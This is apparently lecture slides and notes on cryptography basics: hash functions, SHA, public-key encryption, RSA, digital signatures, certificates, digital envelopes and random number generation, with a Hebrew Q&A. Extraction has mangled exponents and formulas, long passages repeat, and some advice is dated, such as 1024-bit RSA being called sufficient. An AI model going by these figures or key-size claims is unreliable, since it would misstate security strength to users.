by the National Institute of Standards and Technology (NIST) and published as
a federal information processing standard (FIPS 180) in 1993. When weaknesses
were discovered in SHA, a revised version was issued as FIPS 180-1 in 1995 and is
generally referred to as SHA-1. SHA-1 produces a hash value of 160 bits. In 2002,
NIST produced a revised version of the standard, FIPS 180–2, that defined three
new versions of SHA, with hash value lengths of 256, 384, and 512 bits, known as
SHA-256, SHA-384, and SHA-512. These new versions have the same underlying
structure and use the same types of modular arithmetic and logical binary operations
as SHA-1. In 2005, NIST announced the intention to phase out approval of SHA-1
and move to a reliance on the other SHA versions by 2010. As discussed in Chapter
21, researchers have demonstrated that SHA-1 is far weaker than its 160-bit hash
length suggests, necessitating the move to the newer versions of SHA.

We have discussed the use of hash functions for message authentication and for the
creation of digital signatures (the latter is discussed in more detail later in this chapter).
Here are two other examples of secure hash function applications:

• Passwords: Chapter 3 explains a scheme in which a hash of a password is
stored by an operating system rather than the password itself. Thus, the actual
password is not retrievable by a hacker who gains access to the password file.
In simple terms, when a user enters a password, the hash of that password is
compared to the stored hash value for verification. This application requires
preimage resistance and perhaps second preimage resistance.

• Intrusion detection: Store H(F) for each file on a system and secure the hash
values (e.g., on a CD-R that is kept secure). One can later determine if a file has
been modified by recomputing H(F). An intruder would need to change F without
changing H(F). This application requires weak second preimage resistance
Security of Hash Functions
Additional secure hash function applications:
Passwords - hash of a password is stored by an operating system
intrusion detection - store H(F) for each file on a system and secure the hash values
70

71
70

As with symmetric encryption, there are two
approaches to attacking a secure hash function: cryptanalysis and brute-force attack.
As with symmetric encryption algorithms, cryptanalysis of a hash function involves
exploiting logical weaknesses in the algorithm.
The strength of a hash function against brute-force attacks depends solely on
the length of the hash code produced by the algorithm.
For a hash code of length n,
the level of effort required is proportional to the following:
Preimage resistant 2n
Second preimage resistant 2n
Collision resistant 2n/2

If collision resistance is required (and this is desirable for a general-purpose
secure hash code), then the value 2n/2 determines the strength of the hash code against
brute-force attacks. Van Oorschot and Wiener [VANO94] pre sented a design for a
$10 million collision search machine for MD5, which has a 128-bit hash length, that
could find a collision in 24 days. Thus a 128-bit code may be viewed as inadequate.
The next step up, if a hash code is treated as a sequence of 32 bits, is a 160-bit hash
length. With a hash length of 160 bits, the same search machine would require over
four thousand years to find a collision. With today’s technology, the time would be
much shorter, so that 160 bits now appears suspect.

In recent years, the most widely used
hash function has been the Secure Hash Algorithm (SHA). SHA was developed
by the National Institute of Standards and Technology (NIST) and published as
a federal information processing standard (FIPS 180) in 1993. When weaknesses
were discovered in SHA, a revised version was issued as FIPS 180-1 in 1995 and is
generally referred to as SHA-1. SHA-1 produces a hash value of 160 bits. In 2002,
NIST produced a revised version of the standard, FIPS 180–2, that defined three
new versions of SHA, with hash value lengths of 256, 384, and 512 bits, known as
SHA-256, SHA-384, and SHA-512. These new versions have the same underlying
structure and use the same types of modular arithmetic and logical binary operations
as SHA-1. In 2005, NIST announced the intention to phase out approval of SHA-1
and move to a reliance on the other SHA versions by 2010. As discussed in Chapter
21, researchers have demonstrated that SHA-1 is far weaker than its 160-bit hash
length suggests, necessitating the move to the newer versions of SHA.

We have discussed the use of hash functions for message authentication and for the
creation of digital signatures (the latter is discussed in more detail later in this chapter).
Here are two other examples of secure hash function applications:

• Passwords: Chapter 3 explains a scheme in which a hash of a password is
stored by an operating system rather than the password itself. Thus, the actual
password is not retrievable by a hacker who gains access to the password file.
In simple terms, when a user enters a password, the hash of that password is
compared to the stored hash value for verification. This application requires
preimage resistance and perhaps second preimage resistance.

• Intrusion detection: Store H(F) for each file on a system and secure the hash
values (e.g., on a CD-R that is kept secure). One can later determine if a file has
been modified by recomputing H(F). An intruder would need to change F without
changing H(F). This application requires weak second preimage resistance
Public-Key Encryption
Publicly proposed by Diffie and Hellman in 1976

Asymmetric
Uses two separate keys
Public key (PUK) and private key (PRK)
Public key is made public for others to use
There is a relation between the private and public key.

Some form of protocol is needed for distribution
71

72

Public-key encryption, first publicly proposed by Diffie and Hellman in 1976
[DIFF76], is the first truly revolutionary advance in encryption in literally thousands
of years. Public-key algorithms are based on mathematical functions rather than on
simple operations on bit patterns, such as are used in symmetric encryption algorithms.
More important, public-key cryptography is asymmetric, involving the use
of two separate keys, in contrast to symmetric encryption, which uses only one key.
The use of two keys has profound consequences in the areas of confidentiality, key
distribution, and authentication.

Before proceeding, we should first mention several common misconceptions
concerning public-key encryption. One is that public-key encryption is more secure
from cryptanalysis than symmetric encryption. In fact, the security of any encryption
scheme depends on (1) the length of the key and (2) the computational work involved
in breaking a cipher. There is nothing in principle about either symmetric or public-key
encryption that makes one superior to another from the point of view of resisting cryptanalysis.
A second misconception is that public-key encryption is a general- purpose
technique that has made symmetric encryption obsolete. On the contrary, because of
the computational overhead of current public-key encryption schemes, there seems no
foreseeable likelihood that symmetric encryption will be abandoned. Finally, there is
a feeling that key distribution is trivial when using public-key encryption, compared to
the rather cumbersome handshaking involved with key distribution centers for symmetric
encryption. For public-key key distribution, some form of protocol is needed,
often involving a central agent, and the procedures involved are no simpler or any
more efficient than those required for symmetric encryption.

As the names suggest, the public key of the pair is made public for others to
use, while the private key is known only to its owner. A general-purpose public-key
cryptographic algorithm relies on one key for encryption and a different but related
key for decryption.

The essential steps are the following:

1. Each user generates a pair of keys to be used for the encryption and decryption
of messages.

2. Each user places one of the two keys in a public register or other accessible
file. This is the public key. The companion key is kept private. As Figure 2.7a
suggests, each user maintains a collection of public keys obtained from others.

3. If Bob wishes to send a private message to Alice, Bob encrypts the message
using Alice’s public key.

4. When Alice receives the message, she decrypts it using her private key. No
other recipient can decrypt the message because only Alice knows Alice’s private
key.

With this approach, all participants have access to public keys, and private keys
are generated locally by each participant and therefore need never be distributed.
As long as a user protects his or her private key, incoming communication is secure.
At any time, a user can change the private key and publish the companion public
key to replace the old public key.
71
Public-Key Encryption [58] 
(Confidentiality) 
72

73
72

A public-key encryption scheme has six ingredients (Figure 2.7a):

• Plaintext: This is the readable message or data that is fed into the algorithm as
input.

• Encryption algorithm: The encryption algorithm performs various transformations
on the plaintext.

• Public and private key: This is a pair of keys that have been selected so that
if one is used for encryption, the other is used for decryption. The exact
transformations performed by the encryption algorithm depend on the public
or private key that is provided as input.

Ciphertext: This is the scrambled message produced as output. It depends on
the plaintext and the key. For a given message, two different keys will produce
two different ciphertexts.

• Decryption algorithm: This algorithm accepts the ciphertext and the matching
key and produces the original plaintext.

As the names suggest, the public key of the pair is made public for others to
use, while the private key is known only to its owner. A general-purpose public-key
cryptographic algorithm relies on one key for encryption and a different but related
key for decryption.

The essential steps are the following:

1. Each user generates a pair of keys to be used for the encryption and decryption
of messages.

2. Each user places one of the two keys in a public register or other accessible
file. This is the public key. The companion key is kept private. As Figure 2.7a
suggests, each user maintains a collection of public keys obtained from others.

3. If Bob wishes to send a private message to Alice, Bob encrypts the message
using Alice’s public key.
4. When Alice receives the message, she decrypts it using her private key. No
other recipient can decrypt the message because only Alice knows Alice’s private
key.

With this approach, all participants have access to public keys, and private keys
are generated locally by each participant and therefore need never be distributed.
As long as a user protects his or her private key, incoming communication is secure.
At any time, a user can change the private key and publish the companion public
key to replace the old public key.

Note that the scheme of Figure 2.7a is directed toward providing confidentiality:
Only the intended recipient should be able to decrypt the ciphertext because only
the intended recipient is in possession of the required private key. Whether in fact
confidentiality is provided depends on a number of factors, including the security of
the algorithm, whether the private key is kept secure, and the security of any protocol
of which the encryption function is a part.
Private-Key Encryption
(Authentication \ data integrity)
73

74
73

Figure 2.7b illustrates another mode of operation of public-key cryptography.
In this scheme, a user encrypts data using his or her own private key.
Anyone who knows the corresponding public key will then be able to decrypt the
message.

The scheme of Figure 2.7b is directed toward providing authentication
and/or data integrity. If a user is able to successfully recover the plaintext from
Bob’s ciphertext using Bob’s public key, this indicates that only Bob could have
encrypted the plaintext, thus providing authentication. Further, no one but
Bob would be able to modify the plaintext because only Bob could encrypt the
plaintext with Bob’s private key. Once again, the actual provision of authentication
or data integrity depends on a variety of factors. This issue is addressed
primarily in Chapter 21, but other references are made to it where appropriate in
this text.
Requirements for Public-Key Cryptosystems
Computationally easy to create key pairs

Computationally easy for sender knowing public key to encrypt messages

Computationally easy for receiver knowing private key to decrypt ciphertext
74

75
74

1. It is computationally easy for a party B to generate a pair (public key PUb, private key PRb).

2. It is computationally easy for a sender A, knowing the public key and the message to be encrypted, M, to generate the corresponding ciphertext: C = E(PUb, M)

3. It is computationally easy for the receiver B to decrypt the resulting ciphertext using the private key to recover the original message:
M = D(PRb,C) = D[PRb, E(PUb, M)]

4. It is computationally infeasible for an opponent, knowing the public key, PUb, to determine the private key, PRb.

5. It is computationally infeasible for an opponent, knowing the public key, PUb, and a ciphertext, C, to recover the original message, M.

We can add a sixth requirement that, although useful, is not necessary for all public-key applications:

6. Either of the two related keys can be used for encryption, with the other used for decryption.
M = D[PUb, E(PRb, M)] = D[PRb, E(PUb, M)]
Requirements for Public-Key Cryptosystems
Computationally infeasible for opponent to determine private key from public key

Computationally infeasible for opponent to otherwise recover original message

Useful if either key can be used for each role (encryption/Decryption)
75

76
75

1. It is computationally easy for a party B to generate a pair (public key PUb, private key PRb).

2. It is computationally easy for a sender A, knowing the public key and the message to be encrypted, M, to generate the corresponding ciphertext: C = E(PUb, M)

3. It is computationally easy for the receiver B to decrypt the resulting ciphertext using the private key to recover the original message:
M = D(PRb,C) = D[PRb, E(PUb, M)]

4. It is computationally infeasible for an opponent, knowing the public key, PUb, to determine the private key, PRb.

5. It is computationally infeasible for an opponent, knowing the public key, PUb, and a ciphertext, C, to recover the original message, M.

We can add a sixth requirement that, although useful, is not necessary for all public-key applications:

6. Either of the two related keys can be used for encryption, with the other used for decryption.
M = D[PUb, E(PRb, M)] = D[PRb, E(PUb, M)]
Asymmetric Encryption Algorithms
76


77
76

RSA One of the first public-key schemes was developed in 1977 by Ron Rivest, Adi
Shamir, and Len Adleman at MIT and first published in 1978 [RIVE78]. The RSA
scheme has since reigned supreme as the most widely accepted and implemented
approach to public-key encryption. RSA is a block cipher in which the plaintext and
ciphertext are integers between 0 and n – 1 for some n.

In 1977, the three inventors of RSA dared Scientific American readers to decode
a cipher they printed in Martin Gardner’s “Mathematical Games” column. They
offered a $100 reward for the return of a plaintext sentence, an event they predicted
might not occur for some 40 quadrillion years. In April of 1994, a group working over
the Internet and using over 1600 computers claimed the prize after only eight months
of work [LEUT94]. This challenge used a public-key size (length of n) of 129 decimal
digits, or around 428 bits. This result does not invalidate the use of RSA; it simply
means that larger key sizes must be used. Cur rently, a 1024-bit key size (about 300
decimal digits) is considered strong enough for virtually all applications.

DIFFIE-HELLMAN KEY AGREEMENT The first published public-key algo rithm
appeared in the seminal paper by Diffie and Hellman that defined public-key
cryptography [DIFF76] and is generally referred to as Diffie-Hellman key exchange,
or key agreement. A number of commercial products employ this key exchange
technique.

The purpose of the algorithm is to enable two users to securely reach agreement
about a shared secret that can be used as a secret key for subsequent symmetric
encryption of messages. The algorithm itself is limited to the exchange of the keys.

DIGITAL SIGNATURE STANDARD The National Institute of Standards and Technology
(NIST) has published Federal Information Processing Standard FIPS PUB 186,
known as the Digital Signature Standard (DSS). The DSS makes use of SHA-1
and presents a new digital signature technique, the Digital Signature Algorithm
(DSA). The DSS was originally proposed in 1991 and revised in 1993 in response to
public feedback concerning the security of the scheme. There was a further minor
revision in 1996. The DSS uses an algorithm that is designed to provide only the digital
signature function. Unlike RSA, it cannot be used for encryption or key exchange.

ELLIPTIC CURVE CRYPTOGRAPHY The vast majority of the products and standards
that use public-key cryptography for encryption and digital signatures use RSA.
The bit length for secure RSA use has increased over recent years, and this has put
a heavier processing load on applications using RSA. This burden has ramifications,
especially for electronic commerce sites that conduct large numbers of secure
transactions. Recently, a competing system has begun to challenge RSA: elliptic
curve cryptography (ECC). Already, ECC is showing up in standardization efforts,
including the IEEE (Institute of Electrical and Electronics Engineers) P1363
Standard for Public-Key Cryptography.

The principal attraction of ECC compared to RSA is that it appears to offer
equal security for a far smaller bit size, thereby reducing processing overhead. On
the other hand, although the theory of ECC has been around for some time, it is
only recently that products have begun to appear and that there has been sustained
cryptanalytic interest in probing for weaknesses. Thus, the confidence level in ECC
is not yet as high as that in RSA.
Applications for Public-Key Cryptosystems [59]
77

78

Table 2.3 indicates the applications supported by the algorithms
discussed in this section.
77
Digital Signatures
Used for authenticating of:
Source 
Data integrity

Created by encrypting hash code with private key

Does not provide confidentiality
Even in the case of complete encryption
Message is safe from alteration but not eavesdropping
78

79

Public-key encryption can be used for authentication, as suggested by Figure 2.6b.
Suppose that Bob wants to send a message to Alice. Although it is not important that
the message be kept secret, he wants Alice to be certain that the message is indeed
from him. For this purpose, Bob uses a secure hash function, such as SHA-512, to
generate a hash value for the message and then encrypts the hash code with his private
key, creating a digital signature. Bob sends the message with the signature attached.
When Alice receives the message plus signature, she (1) calculates a hash value for
the message; (2) decrypts the signature using Bob’s public key; and (3) compares the
calculated hash value to the decrypted hash value. If the two hash values match, Alice
is assured that the message must have been signed by Bob. No one else has Bob’s
private key and therefore no one else could have created a ciphertext that could be
decrypted with Bob’s public key. In addition, it is impossible to alter the message
without access to Bob’s private key, so the message is authenticated both in terms of
source and in terms of data integrity.

It is important to emphasize that the digital signature does not provide confidentiality.
That is, the message being sent is safe from alteration but not safe from
eavesdropping. This is obvious in the case of a signature based on a portion of the
message, because the rest of the message is transmitted in the clear. Even in the
case of complete encryption, there is no protection of confidentiality because any
observer can decrypt the message by using the sender’s public key.
78
Digital Signatures
encrypt the digest only using private key
      - used as digital signature
       - no need for key distribution
79

80
79

Unlike the MAC, a hash function does not also take a secret key as input.
To authenticate a message, the message digest is sent with the message in such a way that the message digest is authentic.
The Figure illustrates three ways in which the message can be authenticated using a hash code. 
The message digest can be encrypted using symmetric encryption (part a); if it is assumed that only the sender and receiver share the encryption key, then authenticity is assured. 
The message digest can also be encrypted using public-key encryption (part b).
The public-key approach has two advantages: It provides a digital signature as well as message authentication; and it does not require the
distribution of keys to communicating parties.

These two approaches have an advantage over approaches that encrypt the entire message in that less computation is required. But an even more common approach is  the use of a technique that avoids encryption altogether. Several reasons
for this interest are pointed out in [TSUD92]:

• Encryption software is quite slow. Even though the amount of data to be
encrypted per message is small, there may be a steady stream of messages into
and out of a system.

• Encryption hardware costs are non-negligible. Low-cost chip implementations
of DES are available, but the cost adds up if all nodes in a network must have
this capability.

• Encryption hardware is optimized toward large data sizes. For small blocks of
data, a high proportion of the time is spent in initialization/invocation overhead.

• An encryption algorithm may be protected by a patent.

Figure 2.6c shows a technique that uses a hash function but no encryption for message authentication. 
This technique, known as a keyed hash MAC, assumes that two communicating parties, say A and B, share a common secret key K.
This secret key is incorporated into the process of generating a hash code. In the
approach illustrated in Figure 2.6c, when A has a message to send to B, it calculates
the hash function over the concatenation of the secret key and the message:
MDM = H(KMK).6 It then sends [ MMDM] to B. Because B possesses K, it can
recompute H(K7M7K) and verify MDM. Because the secret key itself is not sent, it
should not be possible for an attacker to modify an intercepted message. As long as
the secret key remains secret, it should not be possible for an attacker to generate a
false message.

Note that the secret key is used as both a prefix and a suffix to the message. If
the secret key is used as either only a prefix or only a suffix, the scheme is less secure.
This topic is discussed in Chapter 21. Chapter 21 also describes a scheme known
as HMAC, which is somewhat more complex than the approach of Figure 2.6c and
which has become the standard approach for a keyed hash MAC.
Public Key Certificates
The weakness of PKE: 
anyone can forge a publication of the Bob’s public key and 
by the time it is discovered he can read messages aimed at Bob and pretend to be Bob as well
We need a trusted third party – certificate authority CA
80

81
80

בוב הולך קודם לCA ומבקש שיספק לוcertificate , התקשורת היא קודם בין בוב לCA. 

 קיים צד שלשי , certificate authority, לכל אחד שמשתתף בתקשורת , המשתתף הולך לנציג הזה מזדהה בפניו , ומבקש ממנו certificate , שכל מי שרוצה לדבר איתי שכולם יוודאו שהוא בוב. 
מה כולל הcertificate? 
את הפרטים של בוב, 
את המפתח שלו ואת הפרטים של ה certificate , אותו נציג ונצרף את הMAC , ומצמיד אותו להודעה( הריבוע השחור נקרא digital signature) . כדי לעשות ווידוא למפתח הפומבי של בוב , נעשה האש למפתח של בוב ושאר השדות שמעליו ומתחתיו , ונעשה פיענוח של החתימה ואם נקבל פרטים שונים כנראה שמי שמדבר איתנו הוא לא בוב. 



On the face of it, the point of public-key encryption is that the public key is public.
Thus, if there is some broadly accepted public-key algorithm, such as RSA, any
participant can send his or her public key to any other participant or broadcast the
key to the community at large. Although this approach is convenient, it has a major
weakness. Anyone can forge such a public announcement. That is, some user could
pretend to be Bob and send a public key to another participant or broadcast such a
public key. Until such time as Bob discovers the forgery and alerts other participants,
the forger is able to read all encrypted messages intended for A and can use the
forged keys for authentication.

The solution to this problem is the public-key certificate. In essence, a certificate
consists of a public key plus a user ID of the key owner, with the whole block
signed by a trusted third party. The certificate also includes some information about
the third party plus an indication of the period of validity of the certificate. Typically,
the third party is a certificate authority (CA) that is trusted by the user community,
such as a government agency or a financial institution. A user can present his
or her public key to the authority in a secure manner and obtain a signed certificate.
The user can then publish the certificate. Anyone needing this user’s public key
can obtain the certificate and verify that it is valid by means of the attached trusted
signature. Figure 2.8 illustrates the process.

One scheme has become universally accepted for formatting public-key
certificates: the X.509 standard. X.509 certificates are used in most network security
applications, including IP Security (IPsec), Transport Layer Security (TLS), Secure
Shell (SSH), and Secure/Multipurpose Internet Mail Extension (S/MIME). We
examine most of these applications in Part Five.
Public Key Certificates
81

82
81

בוב הולך קודם לCA ומבקש שיספק לוcertificate , התקשורת היא קודם בין בוב לCA. 

 קיים צד שלשי , certificate authority, לכל אחד שמשתתף בתקשורת , המשתתף הולך לנציג הזה מזדהה בפניו , ומבקש ממנו certificate , שכל מי שרוצה לדבר איתי שכולם יוודאו שהוא בוב. 
מה כולל הcertificate? 
את הפרטים של בוב, 
את המפתח שלו ואת הפרטים של ה certificate , אותו נציג ונצרף את הMAC , ומצמיד אותו להודעה( הריבוע השחור נקרא digital signature) . כדי לעשות ווידוא למפתח הפומבי של בוב , נעשה האש למפתח של בוב ושאר השדות שמעליו ומתחתיו , ונעשה פיענוח של החתימה ואם נקבל פרטים שונים כנראה שמי שמדבר איתנו הוא לא בוב. 



On the face of it, the point of public-key encryption is that the public key is public.
Thus, if there is some broadly accepted public-key algorithm, such as RSA, any
participant can send his or her public key to any other participant or broadcast the
key to the community at large. Although this approach is convenient, it has a major
weakness. Anyone can forge such a public announcement. That is, some user could
pretend to be Bob and send a public key to another participant or broadcast such a
public key. Until such time as Bob discovers the forgery and alerts other participants,
the forger is able to read all encrypted messages intended for A and can use the
forged keys for authentication.

The solution to this problem is the public-key certificate. In essence, a certificate
consists of a public key plus a user ID of the key owner, with the whole block
signed by a trusted third party. The certificate also includes some information about
the third party plus an indication of the period of validity of the certificate. Typically,
the third party is a certificate authority (CA) that is trusted by the user community,
such as a government agency or a financial institution. A user can present his
or her public key to the authority in a secure manner and obtain a signed certificate.
The user can then publish the certificate. Anyone needing this user’s public key
can obtain the certificate and verify that it is valid by means of the attached trusted
signature. Figure 2.8 illustrates the process.

One scheme has become universally accepted for formatting public-key
certificates: the X.509 standard. X.509 certificates are used in most network security
applications, including IP Security (IPsec), Transport Layer Security (TLS), Secure
Shell (SSH), and Secure/Multipurpose Internet Mail Extension (S/MIME). We
examine most of these applications in Part Five.
Public Key Certificates – hierarchy of trust
82

83
82

בוב הולך קודם לCA ומבקש שיספק לוcertificate , התקשורת היא קודם בין בוב לCA. 

 קיים צד שלשי , certificate authority, לכל אחד שמשתתף בתקשורת , המשתתף הולך לנציג הזה מזדהה בפניו , ומבקש ממנו certificate , שכל מי שרוצה לדבר איתי שכולם יוודאו שהוא בוב. 
מה כולל הcertificate? 
את הפרטים של בוב, 
את המפתח שלו ואת הפרטים של ה certificate , אותו נציג ונצרף את הMAC , ומצמיד אותו להודעה( הריבוע השחור נקרא digital signature) . כדי לעשות ווידוא למפתח הפומבי של בוב , נעשה האש למפתח של בוב ושאר השדות שמעליו ומתחתיו , ונעשה פיענוח של החתימה ואם נקבל פרטים שונים כנראה שמי שמדבר איתנו הוא לא בוב. 



On the face of it, the point of public-key encryption is that the public key is public.
Thus, if there is some broadly accepted public-key algorithm, such as RSA, any
participant can send his or her public key to any other participant or broadcast the
key to the community at large. Although this approach is convenient, it has a major
weakness. Anyone can forge such a public announcement. That is, some user could
pretend to be Bob and send a public key to another participant or broadcast such a
public key. Until such time as Bob discovers the forgery and alerts other participants,
the forger is able to read all encrypted messages intended for A and can use the
forged keys for authentication.

The solution to this problem is the public-key certificate. In essence, a certificate
consists of a public key plus a user ID of the key owner, with the whole block
signed by a trusted third party. The certificate also includes some information about
the third party plus an indication of the period of validity of the certificate. Typically,
the third party is a certificate authority (CA) that is trusted by the user community,
such as a government agency or a financial institution. A user can present his
or her public key to the authority in a secure manner and obtain a signed certificate.
The user can then publish the certificate. Anyone needing this user’s public key
can obtain the certificate and verify that it is valid by means of the attached trusted
signature. Figure 2.8 illustrates the process.

One scheme has become universally accepted for formatting public-key
certificates: the X.509 standard. X.509 certificates are used in most network security
applications, including IP Security (IPsec), Transport Layer Security (TLS), Secure
Shell (SSH), and Secure/Multipurpose Internet Mail Extension (S/MIME). We
examine most of these applications in Part Five.
Digital Envelopes
Protects a message without needing to first arrange for sender and receiver to have the same secret key 
Equates to the same thing as a sealed envelope containing an unsigned letter
The symmetric key is exchanges through Asymmetric PKE
The messages encrypted using the encrypted symmetric key
Advantages:
Short keys
Symmetric - Fast encryption and decryption of messages
New symmetric keys in every session – enhances confidentiality
83


84
83




Another application in which public-key encryption is used to protect a symmetric
key is the digital envelope, which can be used to protect a message without needing
to first arrange for sender and receiver to have the same secret key. The technique
is referred to as a digital envelope, which is the equivalent of a sealed envelope
containing an unsigned letter. The general approach is shown in Figure 2.9. Suppose
Bob wishes to send a confidential message to Alice, but they do not share a symmetric
secret key. Bob does the following:

1. Prepare a message.

2. Generate a random symmetric key that will be used this one time only.

3. Encrypt that message using symmetric encryption the one-time key.

4. Encrypt the one-time key using public-key encryption with Alice’s public key.

5. Attach the encrypted one-time key to the encrypted message and send it to
Alice.

Only Alice is capable of decrypting the one-time key and therefore of recovering
the original message. If Bob obtained Alice’s public key by means of Alice’s
public-key certificate, then Bob is assured that it is a valid key.
Digital Envelopes - Encryption
84


85
84




Another application in which public-key encryption is used to protect a symmetric
key is the digital envelope, which can be used to protect a message without needing
to first arrange for sender and receiver to have the same secret key. The technique
is referred to as a digital envelope, which is the equivalent of a sealed envelope
containing an unsigned letter. The general approach is shown in Figure 2.9. Suppose
Bob wishes to send a confidential message to Alice, but they do not share a symmetric
secret key. Bob does the following:

1. Prepare a message.

2. Generate a random symmetric key that will be used this one time only.

3. Encrypt that message using symmetric encryption the one-time key.

4. Encrypt the one-time key using public-key encryption with Alice’s public key.

5. Attach the encrypted one-time key to the encrypted message and send it to
Alice.

Only Alice is capable of decrypting the one-time key and therefore of recovering
the original message. If Bob obtained Alice’s public key by means of Alice’s
public-key certificate, then Bob is assured that it is a valid key.
Digital Envelopes
85


86
85




Another application in which public-key encryption is used to protect a symmetric
key is the digital envelope, which can be used to protect a message without needing
to first arrange for sender and receiver to have the same secret key. The technique
is referred to as a digital envelope, which is the equivalent of a sealed envelope
containing an unsigned letter. The general approach is shown in Figure 2.9. Suppose
Bob wishes to send a confidential message to Alice, but they do not share a symmetric
secret key. Bob does the following:

1. Prepare a message.

2. Generate a random symmetric key that will be used this one time only.

3. Encrypt that message using symmetric encryption the one-time key.

4. Encrypt the one-time key using public-key encryption with Alice’s public key.

5. Attach the encrypted one-time key to the encrypted message and send it to
Alice.

Only Alice is capable of decrypting the one-time key and therefore of recovering
the original message. If Bob obtained Alice’s public key by means of Alice’s
public-key certificate, then Bob is assured that it is a valid key.
Q&A
Bob encrypt a message with symmetric key, and sends it to Alice who owns this key as well, what did he achieve?

Bob encrypts a message with his private key, and sends it to Alice, what did he achieve?

Bob encrypts a message with his public key, and sends it to Alice, what did he achieve?

Bob encrypts message with Alice’s public key, and sends it to Alice, what did he achieve?

Bob encrypts message’s hash code with his private key, and sends it to Alice with the message itself encrypted with Alice’s public key, what did he achieve?

Bob encrypts message’s hash code with Alice’s public key, and sends it to Alice, what did he achieve?

Confidentiality?
Message authentication (integrity of content and time)?
Source authentication?
Nothing
86


87
86

תשובות לשאלות:

a+c המידע מגיע מוגן, רק למי שאני חולק איתו את המפתח ולכן אני אליס יודעת שזה אני.
c - בלבד כי כולם יודעים את הציבורי שלי, ולכן אין כאן confidentiality.
d – כלום כי רק לי יש את הפרטי, אין לאף אחד מה לעשות עם זה..... ובטח שגם לא לי.
a - בלבד כי המידע אומנם מגיע מוגן, אבל כולם יכולים להצפין עם הציבורי של אליס ולכן לא ידוע מי שלח בתצורה הזו.
A + C + B
D – כלום כי רק אליס יכולה לפתוח את ה HASH ומה היא תעשה איתה בדיוק?




Another application in which public-key encryption is used to protect a symmetric
key is the digital envelope, which can be used to protect a message without needing
to first arrange for sender and receiver to have the same secret key. The technique
is referred to as a digital envelope, which is the equivalent of a sealed envelope
containing an unsigned letter. The general approach is shown in Figure 2.9. Suppose
Bob wishes to send a confidential message to Alice, but they do not share a symmetric
secret key. Bob does the following:

1. Prepare a message.

2. Generate a random symmetric key that will be used this one time only.

3. Encrypt that message using symmetric encryption the one-time key.

4. Encrypt the one-time key using public-key encryption with Alice’s public key.

5. Attach the encrypted one-time key to the encrypted message and send it to
Alice.

Only Alice is capable of decrypting the one-time key and therefore of recovering
the original message. If Bob obtained Alice’s public key by means of Alice’s
public-key certificate, then Bob is assured that it is a valid key.
Strength of algorithms
Key space
Strength of the algorithm
Correctness of implementation
Key management
Random number generator
87

88
87


Cryptanalysis
Breaking codes
Attack vectors
Key
Algorithm
Implementation
Data
Social engineering
88

89
88


Random Numbers
Keys for public-key algorithms
Stream key for symmetric stream cipher
Symmetric key to be used as a temporary session key or in creating a digital envelope
Handshaking to prevent replay attacks
Session key
89

90
89

A number of network security algorithms based on cryptography make use of random numbers.
For example,
• Generation of keys for the RSA public-key encryption algorithm and other public-key algorithms.
• Generation of a stream key for symmetric stream cipher.
• Generation of a symmetric key for use as a temporary session key or in creating a digital envelope.

• In a number of key distribution scenarios, such as Kerberos, random numbers are used for handshaking to prevent replay attacks.

• Session key generation, whether done by a key distribution center or by one of the principals.

These applications give rise to two distinct and not necessarily compatible
requirements for a sequence of random numbers: randomness and unpredictability.
Random Number Requirements
Randomness
Uniform distribution
frequency of occurrence of each of the numbers should be approximately the same
Independence
no one value in the sequence can be inferred from the others
Unpredictability
Each number is statistically independent of other numbers in the sequence
Opponent should not be able to predict future elements of the sequence on the basis of earlier elements
90

91

Traditionally, the concern in the generation of a sequence of
allegedly random numbers has been that the sequence of numbers be random in
some well-defined statistical sense. The following two criteria are used to validate
that a sequence of numbers is random:

• Uniform distribution: The distribution of numbers in the sequence should be
uniform; that is, the frequency of occurrence of each of the numbers should be
approximately the same.

• Independence: No one value in the sequence can be inferred from the others.

Although there are well-defined tests for determining that a sequence of numbers
matches a particular distribution, such as the uniform distribution, there is no such
test to “prove” independence. Rather, a number of tests can be applied to demonstrate
if a sequence does not exhibit independence. The general strategy is to apply a number
of such tests until the confidence that independence exists is sufficiently strong.

In the context of our discussion, the use of a sequence of numbers that appear
statistically random often occurs in the design of algorithms related to cryptography.
For example, a fundamental requirement of the RSA public-key encryption scheme 
is the ability to generate prime numbers. In general, it is
difficult to determine if a given large number N is prime. A brute-force approach
would be to divide N by every odd integer less than 1N. If N is on the order, say,
of 10150, a not uncommon occurrence in public-key cryptography, such a brute-force
approach is beyond the reach of human analysts and their computers. However, a
number of effective algorithms exist that test the primality of a number by using a
sequence of randomly chosen integers as input to relatively simple computations.
If the sequence is sufficiently long (but far, far less than 110150), the primality of
a number can be determined with near certainty. This type of approach, known
as randomization, crops up frequently in the design of algorithms. In essence, if a
problem is too hard or time-consuming to solve exactly, a simpler, shorter approach
based on randomization is used to provide an answer with any desired level of
confidence.

UNPREDICTABILITY 
In applications such as reciprocal authentication and session key
generation, the requirement is not so much that the sequence of numbers be statistically
random but that the successive members of the sequence are unpredictable. With
“true” random sequences, each number is statistically independent of other numbers
in the sequence and therefore unpredictable. However, as is discussed shortly, true
random numbers are not always used; rather, sequences of numbers that appear to
be random are generated by some algorithm. In this latter case, care must be takent
of earlier elements.
90
Random versus Pseudorandom
Cryptographic applications typically make use of algorithmic techniques for random number generation
algorithms are deterministic and therefore produce sequences of numbers that are not statistically random
Pseudorandom numbers are:
sequences produced that satisfy statistical randomness tests
likely to be predictable
True random number generator (TRNG):
uses a nondeterministic source to produce randomness
most operate by measuring unpredictable natural processes
e.g. radiation, gas discharge, leaky capacitors
increasingly provided on modern processors 
91

92
91

Cryptographic applications typically make use of algorithmic techniques for random
number generation. These algorithms are deterministic and therefore produce
sequences of numbers that are not statistically random. However, if the algorithm is
good, the resulting sequences will pass many reasonable tests of randomness. Such
numbers are referred to as pseudorandom numbers.

You may be somewhat uneasy about the concept of using numbers generated
by a deterministic algorithm as if they were random numbers. Despite what might
be called philosophical objections to such a practice, it generally works. As one
expert on probability theory puts it [HAMM91],

For practical purposes we are forced to accept the awkward concept
of “relatively random” meaning that with regard to the proposed
use we can see no reason why they will not perform as if they were
random (as the theory usually requires). This is highly subjective
and is not very palatable to purists, but it is what statisticians regularly
appeal to when they take “a random sample”—they hope that
any results they use will have approximately the same properties as
a complete counting of the whole sample space that occurs in their
theory.

A true random number generator (TRNG) uses a nondeterministic source to
produce randomness. Most operate by measuring unpredictable natural processes,
such as pulse detectors of ionizing radiation events, gas discharge tubes, and leaky
capac itors. Intel has developed a commercially available chip that samples thermal
noise by amplifying the voltage measured across undriven resistors [JUN99].
A group at Bell Labs has developed a technique that uses the variations in the
response time of raw read requests for one disk sector of a hard disk [JAKO98].
